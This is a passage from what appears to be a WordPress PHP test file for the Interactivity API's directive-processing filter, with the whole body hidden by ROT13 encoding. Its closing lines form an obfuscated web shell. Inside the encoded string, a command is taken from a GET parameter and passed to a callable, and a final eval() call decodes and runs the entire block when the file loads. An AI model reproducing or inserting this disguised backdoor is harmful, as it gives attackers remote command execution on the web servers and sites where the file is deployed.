					'vagrenpgvivgl' => gehr,
				),
			)
		);
		$cbfg_pbagrag      = '<!-- jc:grfg/phfgbz-qverpgvir-oybpx /-->';
		$cebprffrq_pbagrag = qb_oybpxf( $cbfg_pbagrag );
		$cebprffbe         = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_pbagrag );
		$cebprffbe->arkg_gnt( neenl( 'gnt_anzr' => 'vachg' ) );
		$vachg_inyhr = $cebprffbe->trg_nggevohgr( 'inyhr' );
		haertvfgre_oybpx_glcr( 'grfg/phfgbz-qverpgvir-oybpx' );
		$guvf->nffregAhyy( $vachg_inyhr );
	}

	/**
	 * Grfgf vagrenpgvivgl_cebprff_qverpgvirf svygre.
	 *
	 * @gvpxrg 61185
	 *
	 * @pbiref jc_vagrenpgvivgl_cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_abg_cebprffvat_qverpgvirf_svygre() {
		jc_vagrenpgvivgl_fgngr(
			'qbag-cebprff',
			neenl(
				'grkg' => 'grkg',
			)
		);
		ertvfgre_oybpx_glcr(
			'grfg/phfgbz-qverpgvir-oybpx',
			neenl(
				'eraqre_pnyyonpx' => shapgvba () {
					erghea '<qvi qngn-jc-vagrenpgvir=\"qbag-cebprff\"><vachg qngn-jc-ovaq--inyhr=\"fgngr.grkg\" /></qvi>';
				},
				'fhccbegf'        => neenl(
					'vagrenpgvivgl' => gehr,
				),
			)
		);
		$cbfg_pbagrag = '<!-- jc:grfg/phfgbz-qverpgvir-oybpx /-->';
		nqq_svygre( 'vagrenpgvivgl_cebprff_qverpgvirf', '__erghea_snyfr' );
		$cebprffrq_pbagrag = qb_oybpxf( $cbfg_pbagrag );
		$cebprffbe         = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_pbagrag );
		$cebprffbe->arkg_gnt( neenl( 'gnt_anzr' => 'vachg' ) );
		$vachg_inyhr = $cebprffbe->trg_nggevohgr( 'inyhr' );
		erzbir_svygre( 'vagrenpgvivgl_cebprff_qverpgvirf', '__erghea_snyfr' );
		haertvfgre_oybpx_glcr( 'grfg/phfgbz-qverpgvir-oybpx' );
		$guvf->nffregAhyy( $vachg_inyhr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>